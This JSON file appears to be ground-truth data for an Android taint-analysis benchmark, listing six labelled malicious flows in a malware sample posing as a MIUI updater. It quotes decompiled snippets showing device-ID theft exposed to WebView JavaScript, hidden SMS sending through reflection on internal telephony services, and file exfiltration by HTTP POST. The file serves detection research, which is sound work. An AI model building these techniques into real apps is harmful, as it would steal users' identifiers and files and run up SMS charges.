{
  "fileName" : "overlaylocker2_android_samp.apk",
  "day" : "2019-10-09",
  "findings" : [ {
    "source" : {
      "statement" : "return ((TelephonyManager) this.mContext.getSystemService(\"phone\")).getDeviceId();",
      "methodName" : "public String deviceid()",
      "className" : "brandmangroupe.miui.updater.MeSetting",
      "lineNo" : 188,
      "targetName" : "getDeviceId",
      "targetNo" : 1,
      "jimpleStmt" : "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
    },
    "sink" : {
      "statement" : "webview.addJavascriptInterface(new MeSetting(this), \"MeSetting\");",
      "methodName" : "public int onStartCommand(Intent intent, int flags, int startId)",
      "className" : "brandmangroupe.miui.updater.GlobalCode",
      "lineNo" : 87,
      "targetName" : "addJavascriptInterface",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r3.<android.webkit.WebView: void addJavascriptInterface(java.lang.Object,java.lang.String)>($r8, \"MeSetting\")"
    },
    "intermediateFlows" : [ ],
    "attributes" : {
      "interProcedural" : true
    },
    "ID" : 1,
    "description" : "This malicious flow reads the device id and uses it as the return value of the method imei() of the class MeSetting. An object of MeSetting is injected into the WebView by addJavascriptInterface. The method imei() can be invoked via JavaScript code.  "
  }, {
    "source" : {
      "statement" : "telephonyInfo.imsiSIM1 = telephonyManager.getDeviceId();",
      "methodName" : "public static TelephonyInfo getInstance(Context context)",
      "className" : "brandmangroupe.miui.updater.TelephonyInfo",
      "lineNo" : 64,
      "targetName" : "getDeviceId",
      "targetNo" : 1,
      "jimpleStmt" : "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
    },
    "sink" : {
      "statement" : "webview.addJavascriptInterface(new MeSystem(this), \"MeSystem\");",
      "methodName" : "public int onStartCommand(Intent intent, int flags, int startId)",
      "className" : "brandmangroupe.miui.updater.GlobalCode",
      "lineNo" : 88,
      "targetName" : "addJavascriptInterface",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r3.<android.webkit.WebView: void addJavascriptInterface(java.lang.Object,java.lang.String)>($r9, \"MeSystem\")"
    },
    "intermediateFlows" : [ {
      "statement" : "return telephonyInfo;",
      "methodName" : "public static TelephonyInfo getInstance(Context context)",
      "className" : "brandmangroupe.miui.updater.TelephonyInfo",
      "lineNo" : 102,
      "ID" : 1
    }, {
      "statement" : "TelephonyInfo telephonyInfo = TelephonyInfo.getInstance(this.mContext);",
      "methodName" : "public void call(String number)",
      "className" : "brandmangroupe.miui.updater.MeSystem",
      "lineNo" : 57,
      "ID" : 2
    }, {
      "statement" : "String imsiSIM1 = telephonyInfo.getImsiSIM1();",
      "methodName" : "public String dualsim()",
      "className" : "brandmangroupe.miui.updater.MeSystem",
      "lineNo" : 59,
      "ID" : 3
    }, {
      "statement" : "return \" IME1 : \" + imsiSIM1 + \"\\n\" + \" IME2 : \" + imsiSIM2 + \"\\n\" + \" IS DUAL SIM : \" + telephonyInfo.isDualSIM() + \"\\n\" + \" IS SIM1 READY : \" + isSIM1Ready + \"\\n\" + \" IS SIM2 READY : \" + telephonyInfo.isSIM2Ready() + \"\\n\";",
      "methodName" : "public String dualsim()",
      "className" : "brandmangroupe.miui.updater.MeSystem",
      "lineNo" : 66,
      "ID" : 4
    } ],
    "attributes" : {
      "interProcedural" : true,
      "staticField" : true
    },
    "ID" : 2,
    "description" : "This malicious flow reads the device id and stores it as a field of an TelephonyInfo object. This information will be used as the return value of the method dualsim() of the class MeSystem. An object of MeSystem is injected into the WebView by addJavascriptInterface. The method dualsim() can be invoked via JavaScript code.  "
  }, {
    "source" : {
      "statement" : "Method method = Class.forName(\"android.os.ServiceManager\").getDeclaredMethod(\"getService\", new Class[]{String.class});",
      "methodName" : "public boolean sendSMS(int simID, String toNum, String smsText)",
      "className" : "brandmangroupe.miui.updater.MeSystem",
      "lineNo" : 110,
      "targetName" : "getDeclaredMethod",
      "targetNo" : 1,
      "jimpleStmt" : "$r7 = virtualinvoke $r5.<java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>(\"getService\", $r6)"
    },
    "sink" : {
      "statement" : "Object param = method.invoke(null, new Object[]{name});",
      "methodName" : "public boolean sendSMS(int simID, String toNum, String smsText)",
      "className" : "brandmangroupe.miui.updater.MeSystem",
      "lineNo" : 112,
      "targetName" : "invoke",
      "targetNo" : 1,
      "jimpleStmt" : "$r9 = virtualinvoke $r7.<java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>(null, $r8)"
    },
    "intermediateFlows" : [ ],
    "attributes" : {
      "reflection" : true
    },
    "ID" : 3,
    "description" : "This malicious flow uses Java Reflection to execute code which gets the service for a selected sim card. "
  }, {
    "source" : {
      "statement" : "method = Class.forName(\"com.android.internal.telephony.ISms$Stub\").getDeclaredMethod(\"asInterface\", new Class[]{IBinder.class});",
      "methodName" : "public boolean sendSMS(int simID, String toNum, String smsText)",
      "className" : "brandmangroupe.miui.updater.MeSystem",
      "lineNo" : 114,
      "targetName" : "getDeclaredMethod",
      "targetNo" : 1,
      "jimpleStmt" : "$r7 = virtualinvoke $r5.<java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>(\"asInterface\", $r6)"
    },
    "sink" : {
      "statement" : "stubObj.getClass().getMethod(\"sendText\", new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class}).invoke(stubObj, new Object[]{toNum, null, smsText, null, null});",
      "methodName" : "public boolean sendSMS(int simID, String toNum, String smsText)",
      "className" : "brandmangroupe.miui.updater.MeSystem",
      "lineNo" : 119,
      "targetName" : "invoke",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r7.<java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>($r9, $r8)"
    },
    "intermediateFlows" : [ {
      "statement" : "Object stubObj = method.invoke(null, new Object[]{param});",
      "methodName" : "public boolean sendSMS(int simID, String toNum, String smsText)",
      "className" : "brandmangroupe.miui.updater.MeSystem",
      "lineNo" : 116,
      "ID" : 1
    } ],
    "attributes" : {
      "reflection" : true
    },
    "ID" : 4,
    "description" : "This malicious flow uses Java Reflection to execute code which sends SMS messages. "
  }, {
    "source" : {
      "statement" : "FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));",
      "methodName" : "public void file2url(String file, String urlo)",
      "className" : "brandmangroupe.miui.updater.MeFile",
      "lineNo" : 72,
      "targetName" : "FileInputStream",
      "targetNo" : 1,
      "jimpleStmt" : "specialinvoke $r4.<java.io.FileInputStream: void <init>(java.io.File)>($r7)"
    },
    "sink" : {
      "statement" : "outputStream.flush();",
      "methodName" : "public void file2url(String file, String urlo)",
      "className" : "brandmangroupe.miui.updater.MeFile",
      "lineNo" : 116,
      "targetName" : "flush",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r5.<java.io.DataOutputStream: void flush()>()"
    },
    "intermediateFlows" : [ {
      "statement" : "int bytesRead = fileInputStream.read(buffer, 0, bufferSize);",
      "methodName" : "public void file2url(String file, String urlo)",
      "className" : "brandmangroupe.miui.updater.MeFile",
      "lineNo" : 98,
      "ID" : 1
    }, {
      "statement" : "outputStream.write(buffer, 0, bufferSize);",
      "methodName" : "public void file2url(String file, String urlo)",
      "className" : "brandmangroupe.miui.updater.MeFile",
      "lineNo" : 102,
      "ID" : 2
    } ],
    "attributes" : {
      "flowSensitive" : true,
      "intraProcedural" : true,
      "objectSensitive" : true
    },
    "ID" : 5,
    "description" : "This malicious flow reads file and sends the file to a remote server via an HTTP POST request."
  }, {
    "source" : {
      "statement" : "FileInputStream fin = new FileInputStream(new File(filePath));",
      "methodName" : "public void mkdir(String Path)",
      "className" : "brandmangroupe.miui.updater.MeFile",
      "lineNo" : 180,
      "targetName" : "FileInputStream",
      "targetNo" : 1,
      "jimpleStmt" : "specialinvoke $r1.<java.io.FileInputStream: void <init>(java.io.File)>($r2)"
    },
    "sink" : {
      "statement" : "webview.addJavascriptInterface(new MeFile(this), \"MeFile\");",
      "methodName" : "public int onStartCommand(Intent intent, int flags, int startId)",
      "className" : "brandmangroupe.miui.updater.GlobalCode",
      "lineNo" : 89,
      "targetName" : "addJavascriptInterface",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r3.<android.webkit.WebView: void addJavascriptInterface(java.lang.Object,java.lang.String)>($r10, \"MeFile\")"
    },
    "intermediateFlows" : [ {
      "statement" : "String ret = convertStreamToString(fin);",
      "methodName" : "public static String read(String filePath)",
      "className" : "brandmangroupe.miui.updater.MeFile",
      "lineNo" : 181,
      "ID" : 1
    }, {
      "statement" : "return ret;",
      "methodName" : "public static String read(String filePath)",
      "className" : "brandmangroupe.miui.updater.MeFile",
      "lineNo" : 184,
      "ID" : 2
    } ],
    "attributes" : {
      "interProcedural" : true
    },
    "ID" : 6,
    "description" : "This malicious flow reads file from a given path and and uses it as the return value of the method read() of the class MeFile. An object of MeFile is injected into the WebView by addJavascriptInterface. The method read() can be invoked via JavaScript code.  "
  } ]
}